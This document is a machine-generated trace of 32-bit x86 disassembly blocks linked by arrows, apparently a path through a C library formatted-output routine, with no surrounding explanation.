0xb059df5:	mov	edx, dword ptr [ecx + edx*4]
0xb059df8:	shr	eax, 3
0xb059dfb:	test	eax, eax
0xb059dfd:	mov	dword ptr [esi], edx
0xb059dff:	jne	0xb059ded
None
|
|
|
v
0xb059a7a:	sub	edi, dword ptr [ebp - 0x1040]
0xb059a80:	add	edi, dword ptr [ebp - 0x1048]
0xb059a86:	add	dword ptr [ebp - 0x101c], edx
0xb059a8c:	test	edi, edi
0xb059a8e:	jle	0xb058383
None
|
|
|
v
0xb058954:	jne	0xb059d59
None
|
|
|
v
0xb059991:	lea	ecx, dword ptr [edx + 4]
0xb059994:	mov	dword ptr [eax + 0x10], ecx
0xb059997:	mov	eax, dword ptr [ebp - 0x10a0]
0xb05999d:	mov	dword ptr [edx], eax
0xb05999f:	add	eax, 1
0xb0599a2:	je	0xb0571e6
None
|
|
|
v
0xb056ce3:	mov	eax, dword ptr [ebp + 0x10]
0xb056ce6:	mov	dword ptr [esp + 4], 0x25
0xb056cee:	mov	dword ptr [ebp - 0x1014], eax
0xb056cf4:	mov	eax, dword ptr [ebp + 0xc]
0xb056cf7:	mov	dword ptr [esp], eax
0xb056cfa:	call	0xb097300
None
|
|
|
v
0xb05b1ae:	add	eax, 1
0xb05b1b1:	jne	0xb0598fc
None
|
|
|
v
0xb0586bf:	cmp	edi, eax
0xb0586c1:	jne	0xb0571e6
None
|
|
|
v
0xb059e4c:	mov	ecx, 0xa
0xb059e51:	xor	edx, edx
0xb059e53:	div	ecx
0xb059e55:	mov	ecx, dword ptr [ebp - 0x10b8]
0xb059e5b:	sub	esi, 4
0xb059e5e:	mov	edx, dword ptr [ecx + edx*4]
0xb059e61:	test	eax, eax
0xb059e63:	mov	dword ptr [esi], edx
0xb059e65:	jne	0xb059e4c
None
|
|
|
v
0xb05a91a:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05a920:	mov	dword ptr [esp + 0xc], eax
0xb05a924:	mov	dword ptr [esp + 8], 0x7fe
0xb05a92c:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb05a932:	mov	dword ptr [esp + 4], eax
0xb05a936:	lea	eax, dword ptr [ebx - 0x45d30]
0xb05a93c:	mov	dword ptr [esp], eax
0xb05a93f:	call	0xb027820
None
|
|
|
v
0xb058287:	lea	ecx, dword ptr [eax + eax]
0xb05828a:	cmp	ecx, 0x1000
0xb058290:	ja	0xb05b4d5
None
|
|
|
v
0xb05abf4:	mov	eax, dword ptr [ebp - 0x1040]
0xb05abfa:	mov	dword ptr [ebp - 0x1044], ecx
0xb05ac00:	mov	eax, dword ptr [eax + esi*4]
0xb05ac03:	add	eax, 0x1e
0xb05ac06:	and	eax, 0xfffffff0
0xb05ac09:	sub	esp, eax
0xb05ac0b:	lea	eax, dword ptr [esp + 0x23]
0xb05ac0f:	and	eax, 0xfffffff0
0xb05ac12:	mov	dword ptr [edi], eax
0xb05ac14:	mov	edx, dword ptr [ecx + esi*4]
0xb05ac17:	mov	ecx, dword ptr [ebp - 0x1038]
0xb05ac1d:	mov	dword ptr [esp], eax
0xb05ac20:	mov	eax, dword ptr [ebx + 0xecc]
0xb05ac26:	mov	dword ptr [esp + 4], ecx
0xb05ac2a:	call	dword ptr [eax + edx*4 - 0x20]
None
|
|
|
v
0xb058e3a:	mov	ecx, 0x7fffffff
0xb058e3f:	mov	eax, ecx
0xb058e41:	sub	eax, dword ptr [ebp - 0x101c]
0xb058e47:	cmp	edi, eax
0xb058e49:	ja	0xb058740
None
|
|
|
v
0xb058319:	mov	eax, dword ptr [ebp - 0x1040]
0xb05831f:	mov	dword ptr [ebp - 0x1030], eax
0xb058325:	jmp	0xb058230
None
|
|
|
v
0xb059760:	mov	eax, dword ptr [ebx + 0x3768]
0xb059766:	test	eax, eax
0xb059768:	je	0xb059830
None
|
|
|
v
0xb058d82:	cmp	eax, 0xff
0xb058d85:	mov	edi, eax
0xb058d87:	je	0xb0571e6
None
|
|
|
v
0xb0598d6:	mov	eax, dword ptr [ebp + 8]
0xb0598d9:	mov	eax, dword ptr [eax + 0x58]
0xb0598dc:	test	eax, eax
0xb0598de:	je	0xb05b881
None
|
|
|
v
0xb05adcf:	mov	dword ptr [ebp - 0x1060], eax
0xb05add5:	jmp	0xb059321
None
|
|
|
v
0xb05ae6f:	mov	dword ptr [esp], edi
0xb05ae72:	call	0xb0f8ac0
None
|
|
|
v
0xb0585fd:	cmp	dword ptr [ebp - 0x103c], 0
0xb058604:	je	0xb05869e
None
|
|
|
v
0xb059dda:	mov	dword ptr [ebp - 0x1044], 0xa
0xb059de4:	mov	esi, eax
0xb059de6:	jmp	0xb0584fe
None
|
|
|
v
0xb05b080:	add	eax, 1
0xb05b083:	jne	0xb0585e6
None
|
|
|
v
0xb0593c8:	mov	dword ptr [ecx + eax*4], 0
0xb0593cf:	mov	eax, dword ptr [esi + 0x1c]
0xb0593d2:	cmp	eax, 0xff
0xb0593d5:	je	0xb0593de
None
|
|
|
v
0xb05ac2e:	mov	ecx, dword ptr [ebp - 0x1044]
0xb05ac34:	jmp	0xb059500
None
|
|
|
v
0xb0585f6:	add	dword ptr [ebp - 0x101c], 1
0xb0585fd:	cmp	dword ptr [ebp - 0x103c], 0
0xb058604:	je	0xb05869e
None
|
|
|
v
0xb056e1e:	lea	esp, dword ptr [ebp - 0xc]
0xb056e21:	pop	ebx
0xb056e22:	pop	esi
0xb056e23:	pop	edi
0xb056e24:	pop	ebp
0xb056e25:	ret	
None
|
|
|
v
0xb056e10:	mov	ecx, dword ptr [ebp + 0x10]
0xb056e13:	mov	edx, dword ptr [ebp + 0xc]
0xb056e16:	mov	eax, dword ptr [ebp + 8]
0xb056e19:	call	0xb05b950
None
|
|
|
v
0xb058727:	mov	eax, 0x7fffffff
0xb05872c:	sub	eax, dword ptr [ebp - 0x101c]
0xb058732:	add	dword ptr [ebp - 0x101c], edi
0xb058738:	cmp	edi, eax
0xb05873a:	jle	0xb058383
None
|
|
|
v
0xb05b057:	jmp	0xb0571e6
None
|
|
|
v
0xb05b529:	cmp	edi, eax
0xb05b52b:	jne	0xb0571e6
None
|
|
|
v
0xb058ce8:	mov	eax, dword ptr [ebp - 0x1040]
0xb058cee:	mov	dword ptr [ebp - 0x1004], esi
0xb058cf4:	cmp	eax, 0xff
0xb058cf7:	je	0xb05b3fd
None
|
|
|
v
0xb05863a:	lea	ecx, dword ptr [edx + 4]
0xb05863d:	mov	dword ptr [eax + 0x10], ecx
0xb058640:	mov	dword ptr [edx], 0x30
0xb058646:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb058650:	je	0xb0571e6
None
|
|
|
v
0xb05bb63:	jmp	0xb056f9b
None
|
|
|
v
0xb05afc7:	mov	eax, dword ptr [ebp - 0x10a0]
0xb05afcd:	mov	dword ptr [esp + 4], eax
0xb05afd1:	mov	eax, dword ptr [ebp + 8]
0xb05afd4:	mov	dword ptr [esp], eax
0xb05afd7:	call	0xb06a320
None
|
|
|
v
0xb05a7a4:	cmp	dword ptr [ebp - 0x1040], 4
0xb05a7ab:	jg	0xb05a7b7
None
|
|
|
v
0xb05a287:	mov	eax, dword ptr [ebp - 0x1040]
0xb05a28d:	cmp	eax, 0xff
0xb05a290:	je	0xb05b861
None
|
|
|
v
0xb058d60:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb059824:	jmp	0xb058740
None
|
|
|
v
0xb056d1d:	mov	eax, dword ptr [ebx + 0x38d8]
0xb056d23:	test	eax, eax
0xb056d25:	mov	dword ptr [ebp - 0x1020], eax
0xb056d2b:	jne	0xb056fd8
None
|
|
|
v
0xb059ab3:	mov	eax, dword ptr [ebp - 0x101c]
0xb059ab9:	cmp	eax, 0x7ffffffe
0xb059abe:	ja	0xb05b473
None
|
|
|
v
0xb05b419:	cmp	dword ptr [ebp - 0x101c], 0
0xb05b420:	js	0xb05b1f4
None
|
|
|
v
0xb05839d:	mov	ecx, dword ptr [ebp + 8]
0xb0583a0:	imul	esi, dword ptr [ebp - 0x1054], 0x34
0xb0583a7:	add	esi, dword ptr [ebp - 0x1030]
0xb0583ad:	movsx	edx, byte ptr [ecx + 0x46]
0xb0583b1:	mov	eax, dword ptr [esi + 0x14]
0xb0583b4:	mov	edx, dword ptr [ecx + edx + 0x94]
0xb0583bb:	mov	ecx, dword ptr [esi + 0x18]
0xb0583be:	mov	dword ptr [esp + 4], eax
0xb0583c2:	sub	ecx, eax
0xb0583c4:	mov	eax, dword ptr [ebp + 8]
0xb0583c7:	sar	ecx, 2
0xb0583ca:	mov	dword ptr [esp + 8], ecx
0xb0583ce:	mov	dword ptr [esp], eax
0xb0583d1:	call	dword ptr [edx + 0x1c]
None
|
|
|
v
0xb058907:	test	eax, eax
0xb058909:	je	0xb05a7a4
None
|
|
|
v
0xb056e8a:	mov	byte ptr [ebp - 0x1049], 0
0xb056e91:	lea	esi, dword ptr [ebx - 0x152616]
0xb056e97:	mov	dword ptr [ebp - 0x105c], 0
0xb056ea1:	mov	dword ptr [ebp - 0x1064], 0
0xb056eab:	mov	dword ptr [ebp - 0x1054], 0
0xb056eb5:	mov	dword ptr [ebp - 0x1050], 0xffffffff
0xb056ebf:	mov	dword ptr [ebp - 0x1058], 0
0xb056ec9:	lea	edx, dword ptr [eax + 4]
0xb056ecc:	mov	eax, dword ptr [eax + 4]
0xb056ecf:	mov	dword ptr [ebp - 0x1018], edx
0xb056ed5:	lea	edx, dword ptr [eax - 0x20]
0xb056ed8:	cmp	edx, 0x5a
0xb056edb:	mov	dword ptr [ebp - 0x1068], eax
0xb056ee1:	mov	eax, esi
0xb056ee3:	jbe	0xb057048
None
|
|
|
v
0xb05858e:	mov	eax, dword ptr [ebp - 0x10a8]
0xb058594:	or	eax, dword ptr [ebp - 0x10a4]
0xb05859a:	or	eax, dword ptr [ebp - 0x10ac]
0xb0585a0:	cmp	eax, 1
0xb0585a3:	adc	edi, -1
0xb0585a6:	cmp	byte ptr [ebp - 0x104a], 0x20
0xb0585ad:	je	0xb05b50a
None
|
|
|
v
0xb059225:	mov	eax, dword ptr [ebp + 8]
0xb059228:	mov	eax, dword ptr [eax + 0x58]
0xb05922b:	test	eax, eax
0xb05922d:	je	0xb05ad45
None
|
|
|
v
0xb058516:	cmp	dword ptr [ebp - 0x10b4], 0
0xb05851d:	je	0xb058532
None
|
|
|
v
0xb059218:	mov	esi, dword ptr [ebp - 0x1044]
0xb05921e:	mov	esi, dword ptr [esi + 8]
0xb059221:	test	esi, esi
0xb059223:	je	0xb05925f
None
|
|
|
v
0xb059438:	lea	eax, dword ptr [ebp - 0x1014]
0xb05943e:	xor	esi, esi
0xb059440:	mov	edi, dword ptr [ebp - 0x1060]
0xb059446:	mov	dword ptr [ebp - 0x1038], eax
0xb05944c:	mov	eax, dword ptr [ebp - 0x103c]
0xb059452:	test	eax, eax
0xb059454:	je	0xb05840f
None
|
|
|
v
0xb059288:	jmp	0xb058740
None
|
|
|
v
0xb059e01:	jmp	0xb059dab
None
|
|
|
v
0xb0593c0:	mov	eax, dword ptr [esi + 0x20]
0xb0593c3:	cmp	eax, 0xff
0xb0593c6:	je	0xb0593cf
None
|
|
|
v
0xb0594cf:	jle	0xb059530
None
|
|
|
v
0xb0592d0:	mov	ecx, dword ptr [ebp - 0x103c]
0xb0592d6:	mov	eax, dword ptr [ebp - 0x1010]
0xb0592dc:	cmp	ecx, eax
0xb0592de:	cmovae	eax, ecx
0xb0592e1:	cmp	eax, 0x6666666
0xb0592e6:	mov	dword ptr [ebp - 0x103c], eax
0xb0592ec:	ja	0xb05adda
None
|
|
|
v
0xb059a65:	mov	esi, 0x7fffffff
0xb059a6a:	mov	eax, esi
0xb059a6c:	sub	eax, dword ptr [ebp - 0x101c]
0xb059a72:	cmp	edx, eax
0xb059a74:	jg	0xb058740
None
|
|
|
v
0xb05b531:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb05b53b:	ja	0xb05b473
None
|
|
|
v
0xb05957b:	fldz	
0xb05957d:	fstp	xword ptr [edi]
0xb05957f:	jmp	0xb059500
None
|
|
|
v
0xb05b018:	mov	eax, dword ptr [ebp + 8]
0xb05b01b:	mov	eax, dword ptr [eax + 0x58]
0xb05b01e:	test	eax, eax
0xb05b020:	je	0xb05b06d
None
|
|
|
v
0xb059750:	cmp	dword ptr [ebp - 0x10a0], 0xff
0xb05975a:	jg	0xb059830
None
|
|
|
v
0xb0594d1:	cmp	eax, 0x200
0xb0594d6:	je	0xb059518
None
|
|
|
v
0xb05aeff:	mov	eax, dword ptr [ebp - 0x1038]
0xb05af05:	mov	dword ptr [esp], eax
0xb05af08:	call	0xb017470
None
|
|
|
v
0xb058967:	cmp	dword ptr [ebp - 0x10b4], 0
0xb05896e:	je	0xb059ed2
None
|
|
|
v
0xb05b19b:	mov	eax, dword ptr [ebp + 8]
0xb05b19e:	mov	dword ptr [esp + 4], 0x2b
0xb05b1a6:	mov	dword ptr [esp], eax
0xb05b1a9:	call	0xb06a320
None
|
|
|
v
0xb05b3dc:	mov	dword ptr [esp], esi
0xb05b3df:	call	0xb0173f0
None
|
|
|
v
0xb05b48a:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05b490:	mov	dword ptr [esp + 0xc], eax
0xb05b494:	mov	dword ptr [esp + 8], 0x826
0xb05b49c:	jmp	0xb05a92c
None
|
|
|
v
0xb05a296:	mov	dword ptr [esp + 4], eax
0xb05a29a:	mov	dword ptr [esp], esi
0xb05a29d:	call	0xb097270
None
|
|
|
v
0xb058740:	mov	eax, dword ptr [ebp - 0x1024]
0xb058746:	mov	ecx, dword ptr [ebx - 0xdc]
0xb05874c:	mov	dword ptr [eax + ecx], 0x4b
0xb058753:	jmp	0xb0571e6
None
|
|
|
v
0xb059468:	cmp	eax, 3
0xb05946b:	jge	0xb059518
None
|
|
|
v
0xb058d62:	mov	eax, dword ptr [ebp - 0x1040]
0xb058d68:	mov	dword ptr [esp + 0xc], edx
0xb058d6c:	mov	dword ptr [esp], esi
0xb058d6f:	mov	dword ptr [esp + 8], eax
0xb058d73:	lea	eax, dword ptr [ebp - 0x1004]
0xb058d79:	mov	dword ptr [esp + 4], eax
0xb058d7d:	call	0xb096830
None
|
|
|
v
0xb058664:	mov	edx, dword ptr [eax + 0x10]
0xb058667:	cmp	edx, dword ptr [eax + 0x14]
0xb05866a:	jae	0xb05afc7
None
|
|
|
v
0xb058296:	add	ecx, 0xf
0xb058299:	xor	edx, edx
0xb05829b:	and	ecx, 0xfffffff0
0xb05829e:	mov	dword ptr [ebp - 0x1048], ecx
0xb0582a4:	lea	eax, dword ptr [ecx + 0x1e]
0xb0582a7:	mov	ecx, 0x10
0xb0582ac:	div	ecx
0xb0582ae:	mov	ecx, dword ptr [ebp - 0x1048]
0xb0582b4:	shl	eax, 4
0xb0582b7:	sub	esp, eax
0xb0582b9:	lea	eax, dword ptr [esp + 0x23]
0xb0582bd:	and	eax, 0xfffffff0
0xb0582c0:	lea	edx, dword ptr [eax + ecx]
0xb0582c3:	mov	dword ptr [ebp - 0x1040], eax
0xb0582c9:	mov	eax, dword ptr [ebp - 0x1038]
0xb0582cf:	add	eax, ecx
0xb0582d1:	cmp	dword ptr [ebp - 0x1030], edx
0xb0582d7:	cmove	ecx, eax
0xb0582da:	mov	dword ptr [ebp - 0x1038], ecx
0xb0582e0:	mov	eax, dword ptr [ebp - 0x1030]
0xb0582e6:	mov	dword ptr [esp + 8], edi
0xb0582ea:	mov	dword ptr [esp + 4], eax
0xb0582ee:	mov	eax, dword ptr [ebp - 0x1040]
0xb0582f4:	mov	dword ptr [esp], eax
0xb0582f7:	call	0xb07c960
None
|
|
|
v
0xb05b452:	mov	eax, dword ptr [ebp + 8]
0xb05b455:	mov	dword ptr [esp + 4], 0x20
0xb05b45d:	mov	dword ptr [esp], eax
0xb05b460:	call	0xb06a320
None
|
|
|
v
0xb05930c:	add	esi, 0x1e
0xb05930f:	and	esi, 0xfffffff0
0xb059312:	sub	esp, esi
0xb059314:	lea	eax, dword ptr [esp + 0x23]
0xb059318:	and	eax, 0xfffffff0
0xb05931b:	mov	dword ptr [ebp - 0x1060], eax
0xb059321:	mov	ecx, dword ptr [ebp - 0x103c]
0xb059327:	xor	edi, edi
0xb059329:	mov	edx, dword ptr [ebp - 0x1060]
0xb05932f:	lea	eax, dword ptr [ecx + ecx*2]
0xb059332:	lea	eax, dword ptr [edx + eax*4]
0xb059335:	mov	edx, eax
0xb059337:	mov	dword ptr [ebp - 0x1040], eax
0xb05933d:	mov	eax, ecx
0xb05933f:	mov	ecx, edx
0xb059341:	shl	eax, 2
0xb059344:	add	ecx, eax
0xb059346:	mov	dword ptr [esp + 8], eax
0xb05934a:	mov	eax, dword ptr [ebp + 8]
0xb05934d:	mov	dword ptr [ebp - 0x1038], ecx
0xb059353:	mov	eax, dword ptr [eax + 0x3c]
0xb059356:	mov	dword ptr [esp], ecx
0xb059359:	shl	eax, 0x1d
0xb05935c:	sar	eax, 0x1f
0xb05935f:	mov	dword ptr [esp + 4], eax
0xb059363:	call	0xb07ca20
None
|
|
|
v
0xb0582e0:	mov	eax, dword ptr [ebp - 0x1030]
0xb0582e6:	mov	dword ptr [esp + 8], edi
0xb0582ea:	mov	dword ptr [esp + 4], eax
0xb0582ee:	mov	eax, dword ptr [ebp - 0x1040]
0xb0582f4:	mov	dword ptr [esp], eax
0xb0582f7:	call	0xb07c960
None
|
|
|
v
0xb0594c2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb05afe5:	jmp	0xb0571e6
None
|
|
|
v
0xb05b46e:	jmp	0xb0571e6
None
|
|
|
v
0xb059deb:	mov	esi, edi
0xb059ded:	mov	edx, eax
0xb059def:	sub	esi, 4
0xb059df2:	and	edx, 7
0xb059df5:	mov	edx, dword ptr [ecx + edx*4]
0xb059df8:	shr	eax, 3
0xb059dfb:	test	eax, eax
0xb059dfd:	mov	dword ptr [esi], edx
0xb059dff:	jne	0xb059ded
None
|
|
|
v
0xb05947a:	test	eax, eax
0xb05947c:	jns	0xb059518
None
|
|
|
v
0xb058e5e:	test	edx, edx
0xb058e60:	mov	dword ptr [ebp - 0x1044], ecx
0xb058e66:	je	0xb058eba
None
|
|
|
v
0xb056fd8:	mov	edx, dword ptr [ebx - 0x60]
0xb056fde:	mov	ecx, dword ptr [ebp + 8]
0xb056fe1:	mov	eax, dword ptr [ebx + 0x38b8]
0xb056fe7:	ror	eax, 9
0xb056fea:	xor	eax, dword ptr gs:[0x18]
0xb056ff1:	mov	dword ptr [esp + 4], edx
0xb056ff5:	lea	edx, dword ptr [ebp - 0xff8]
0xb056ffb:	mov	dword ptr [esp + 8], ecx
0xb056fff:	mov	dword ptr [esp], edx
0xb057002:	call	eax
None
|
|
|
v
0xb0582fc:	cmp	byte ptr [ebp - 0x1049], 0
0xb058303:	jne	0xb0592b8
None
|
|
|
v
0xb05895a:	cmp	dword ptr [ebp - 0x103c], 0
0xb058961:	jne	0xb059d59
None
|
|
|
v
0xb05bb57:	jmp	0xb056d73
None
|
|
|
v
0xb05978c:	mov	ecx, dword ptr [esi + 0x2c]
0xb05978f:	shl	ecx, 2
0xb059792:	lea	edx, dword ptr [ecx + 0x1e]
0xb059795:	and	edx, 0xfffffff0
0xb059798:	sub	esp, edx
0xb05979a:	lea	edx, dword ptr [esp + 0x23]
0xb05979e:	and	edx, 0xfffffff0
0xb0597a1:	cmp	dword ptr [esi + 0x2c], 0
0xb0597a5:	mov	dword ptr [ebp - 0x103c], edx
0xb0597ab:	je	0xb0597d1
None
|
|
|
v
0xb056dce:	mov	eax, dword ptr [ebp + 8]
0xb056dd1:	mov	eax, dword ptr [eax]
0xb056dd3:	test	ah, 0x80
0xb056dd6:	mov	dword ptr [ebp - 0x1024], eax
0xb056ddc:	jne	0xb056dee
None
|
|
|
v
0xb0586a8:	mov	eax, dword ptr [ebp + 8]
0xb0586ab:	mov	dword ptr [esp + 8], edi
0xb0586af:	mov	dword ptr [esp + 4], 0x30
0xb0586b7:	mov	dword ptr [esp], eax
0xb0586ba:	call	0xb0699f0
None
|
|
|
v
0xb05926f:	mov	eax, 0x7fffffff
0xb059274:	sub	eax, dword ptr [ebp - 0x101c]
0xb05927a:	add	dword ptr [ebp - 0x101c], edi
0xb059280:	cmp	edi, eax
0xb059282:	jbe	0xb058383
None
|
|
|
v
0xb056d69:	lock cmpxchg	dword ptr [edx], ecx
0xb056d6d:	jne	0xb05bb50
None
|
|
|
v
0xb0595d4:	imul	esi, dword ptr [ebp - 0x1054], 0x34
0xb0595db:	add	esi, dword ptr [ebp - 0x1030]
0xb0595e1:	movzx	eax, byte ptr [esi + 0xc]
0xb0595e5:	mov	edx, eax
0xb0595e7:	shr	dl, 3
0xb0595ea:	mov	ecx, edx
0xb0595ec:	mov	edx, eax
0xb0595ee:	and	ecx, 1
0xb0595f1:	shr	dl, 4
0xb0595f4:	mov	dword ptr [ebp - 0x10b4], ecx
0xb0595fa:	mov	ecx, edx
0xb0595fc:	mov	edx, eax
0xb0595fe:	and	ecx, 1
0xb059601:	shr	dl, 5
0xb059604:	mov	dword ptr [ebp - 0x10a8], ecx
0xb05960a:	mov	ecx, edx
0xb05960c:	mov	edx, eax
0xb05960e:	and	ecx, 1
0xb059611:	shr	dl, 6
0xb059614:	mov	dword ptr [ebp - 0x10b0], ecx
0xb05961a:	mov	ecx, edx
0xb05961c:	mov	edx, eax
0xb05961e:	and	ecx, 1
0xb059621:	shr	dl, 7
0xb059624:	mov	dword ptr [ebp - 0x10ac], ecx
0xb05962a:	movzx	ecx, dl
0xb05962d:	mov	edx, eax
0xb05962f:	mov	dword ptr [ebp - 0x10c4], ecx
0xb059635:	mov	ecx, eax
0xb059637:	and	ecx, 1
0xb05963a:	shr	dl, 1
0xb05963c:	mov	dword ptr [ebp - 0x10bc], ecx
0xb059642:	mov	ecx, edx
0xb059644:	movzx	edx, byte ptr [esi + 0xd]
0xb059648:	and	ecx, 1
0xb05964b:	mov	dword ptr [ebp - 0x10a4], ecx
0xb059651:	mov	ecx, edx
0xb059653:	shr	cl, 1
0xb059655:	and	ecx, 1
0xb059658:	mov	dword ptr [ebp - 0x10c0], ecx
0xb05965e:	mov	ecx, eax
0xb059660:	shr	cl, 2
0xb059663:	and	ecx, 1
0xb059666:	mov	dword ptr [ebp - 0x10b8], ecx
0xb05966c:	mov	ecx, dword ptr [esi + 4]
0xb05966f:	shr	dl, 3
0xb059672:	mov	dword ptr [ebp - 0x1048], ecx
0xb059678:	mov	ecx, dword ptr [esi]
0xb05967a:	mov	dword ptr [ebp - 0x1040], ecx
0xb059680:	mov	ecx, edx
0xb059682:	mov	edx, dword ptr [esi + 0x20]
0xb059685:	and	ecx, 1
0xb059688:	mov	dword ptr [ebp - 0x10c8], ecx
0xb05968e:	movzx	ecx, byte ptr [esi + 0x10]
0xb059692:	cmp	edx, 0xff
0xb059695:	mov	byte ptr [ebp - 0x104a], cl
0xb05969b:	mov	ecx, dword ptr [esi + 8]
0xb05969e:	mov	dword ptr [ebp - 0x10a0], ecx
0xb0596a4:	je	0xb0596c3
None
|
|
|
v
0xb0599f5:	mov	edx, dword ptr [ebp - 0x101c]
0xb0599fb:	cmp	edx, 0x7ffffffe
0xb059a01:	ja	0xb05b473
None
|
|
|
v
0xb058d51:	lea	edx, dword ptr [ebp - 0xfe8]
0xb058d57:	xor	eax, eax
0xb058d59:	mov	edi, edx
0xb058d5b:	mov	ecx, 2
0xb058d60:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb0591de:	mov	edx, dword ptr [eax + 0x10]
0xb0591e1:	cmp	edx, dword ptr [eax + 0x14]
0xb0591e4:	jae	0xb05ad8c
None
|
|
|
v
0xb058383:	cmp	dword ptr [ebp - 0x1038], 0
0xb05838a:	jne	0xb05b4a1
None
|
|
|
v
0xb05956d:	mov	edx, dword ptr [ebx + 0xecc]
0xb059573:	test	edx, edx
0xb059575:	jne	0xb05abe9
None
|
|
|
v
0xb0593cf:	mov	eax, dword ptr [esi + 0x1c]
0xb0593d2:	cmp	eax, 0xff
0xb0593d5:	je	0xb0593de
None
|
|
|
v
0xb05b57d:	jmp	0xb0571e6
None
|
|
|
v
0xb05994f:	mov	edx, dword ptr [eax + 0x10]
0xb059952:	cmp	edx, dword ptr [eax + 0x14]
0xb059955:	jae	0xb05aede
None
|
|
|
v
0xb057048:	movzx	eax, byte ptr [ebx + edx - 0x4f8e0]
0xb057050:	mov	ecx, dword ptr [ebx + eax*4 - 0x4f960]
0xb057057:	add	ecx, esi
0xb057059:	mov	eax, ecx
0xb05705b:	jmp	0xb056ee9
None
|
|
|
v
0xb059941:	mov	eax, dword ptr [ebp + 8]
0xb059944:	mov	eax, dword ptr [eax + 0x58]
0xb059947:	test	eax, eax
0xb059949:	je	0xb05aede
None
|
|
|
v
0xb058617:	cmp	dword ptr [ebp - 0x1044], 0x10
0xb05861e:	jne	0xb05869e
None
|
|
|
v
0xb05b4e3:	mov	ecx, dword ptr [ebp - 0x1040]
0xb05b4e9:	test	eax, eax
0xb05b4eb:	jne	0xb058296
None
|
|
|
v
0xb056d82:	add	dword ptr [edx + 4], 1
0xb056d86:	mov	eax, dword ptr [ebp - 0x1028]
0xb056d8c:	sub	eax, dword ptr [ebp + 0xc]
0xb056d8f:	mov	edx, dword ptr [ebp + 8]
0xb056d92:	mov	ecx, dword ptr [ebp + 0xc]
0xb056d95:	mov	edi, eax
0xb056d97:	mov	eax, dword ptr [ebp + 8]
0xb056d9a:	sar	edi, 2
0xb056d9d:	mov	dword ptr [ebp - 0x101c], edi
0xb056da3:	movsx	eax, byte ptr [eax + 0x46]
0xb056da7:	mov	eax, dword ptr [edx + eax + 0x94]
0xb056dae:	mov	dword ptr [esp + 8], edi
0xb056db2:	mov	dword ptr [esp + 4], ecx
0xb056db6:	mov	dword ptr [esp], edx
0xb056db9:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb05ae95:	mov	eax, dword ptr [ebp - 0x1040]
0xb05ae9b:	cmp	dword ptr [ebp - 0x1048], eax
0xb05aea1:	jl	0xb05aea9
None
|
|
|
v
0xb056d46:	mov	eax, dword ptr [ebp + 8]
0xb056d49:	mov	esi, dword ptr gs:[8]
0xb056d50:	mov	edx, dword ptr [eax + 0x48]
0xb056d53:	cmp	esi, dword ptr [edx + 8]
0xb056d56:	je	0xb056d82
None
|
|
|
v
0xb05afdc:	add	eax, 1
0xb05afdf:	jne	0xb058687
None
|
|
|
v
0xb0586c7:	mov	ecx, dword ptr [ebp - 0x101c]
0xb0586cd:	cmp	ecx, 0x7ffffffe
0xb0586d3:	ja	0xb05b473
None
|
|
|
v
0xb0597fb:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb059805:	ja	0xb05ae58
None
|
|
|
v
0xb059f8d:	lea	ecx, dword ptr [edx + 4]
0xb059f90:	mov	dword ptr [eax + 0x10], ecx
0xb059f93:	mov	dword ptr [edx], 0x2b
0xb059f99:	jmp	0xb0585e6
None
|
|
|
v
0xb056d86:	mov	eax, dword ptr [ebp - 0x1028]
0xb056d8c:	sub	eax, dword ptr [ebp + 0xc]
0xb056d8f:	mov	edx, dword ptr [ebp + 8]
0xb056d92:	mov	ecx, dword ptr [ebp + 0xc]
0xb056d95:	mov	edi, eax
0xb056d97:	mov	eax, dword ptr [ebp + 8]
0xb056d9a:	sar	edi, 2
0xb056d9d:	mov	dword ptr [ebp - 0x101c], edi
0xb056da3:	movsx	eax, byte ptr [eax + 0x46]
0xb056da7:	mov	eax, dword ptr [edx + eax + 0x94]
0xb056dae:	mov	dword ptr [esp + 8], edi
0xb056db2:	mov	dword ptr [esp + 4], ecx
0xb056db6:	mov	dword ptr [esp], edx
0xb056db9:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb059ad4:	jmp	0xb058740
None
|
|
|
v
0xb056cae:	mov	eax, dword ptr [ebp + 8]
0xb056cb1:	mov	esi, dword ptr [eax]
0xb056cb3:	test	esi, 8
0xb056cb9:	jne	0xb059290
None
|
|
|
v
0xb059535:	mov	eax, dword ptr [ebp - 0x1014]
0xb05953b:	lea	edx, dword ptr [eax + 8]
0xb05953e:	fld	qword ptr [eax]
0xb059540:	mov	dword ptr [ebp - 0x1014], edx
0xb059546:	fstp	qword ptr [edi]
0xb059548:	jmp	0xb059500
None
|
|
|
v
0xb057018:	jmp	0xb056d86
None
|
|
|
v
0xb0571f9:	mov	eax, dword ptr [ebp - 0x1030]
0xb0571ff:	mov	dword ptr [esp], eax
0xb057202:	call	0xb017470
None
|
|
|
v
0xb0593de:	mov	eax, dword ptr [esi + 0x2c]
0xb0593e1:	test	eax, eax
0xb0593e3:	je	0xb0593a8
None
|
|
|
v
0xb057223:	mov	eax, dword ptr [ebp - 0x1038]
0xb057229:	mov	dword ptr [esp], eax
0xb05722c:	call	0xb017470
None
|
|
|
v
0xb05948b:	mov	eax, dword ptr [ebp + 8]
0xb05948e:	test	byte ptr [eax + 0x3c], 4
0xb059492:	jne	0xb059584
None
|
|
|
v
0xb05b4d5:	mov	dword ptr [esp], ecx
0xb05b4d8:	mov	dword ptr [ebp - 0x1040], ecx
0xb05b4de:	call	0xb0f8ac0
None
|
|
|
v
0xb058230:	mov	eax, dword ptr [ebp - 0x1044]
0xb058236:	add	edi, dword ptr [ebp - 0x1030]
0xb05823c:	mov	dword ptr [esp], esi
0xb05823f:	mov	dword ptr [esp + 0xc], eax
0xb058243:	mov	eax, dword ptr [ebp - 0x103c]
0xb058249:	mov	dword ptr [esp + 8], edi
0xb05824d:	mov	dword ptr [esp + 4], eax
0xb058251:	call	0xb062da0
None
|
|
|
v
0xb05ae87:	test	eax, eax
0xb05ae89:	mov	dword ptr [ebp - 0x1038], eax
0xb05ae8f:	je	0xb0571e6
None
|
|
|
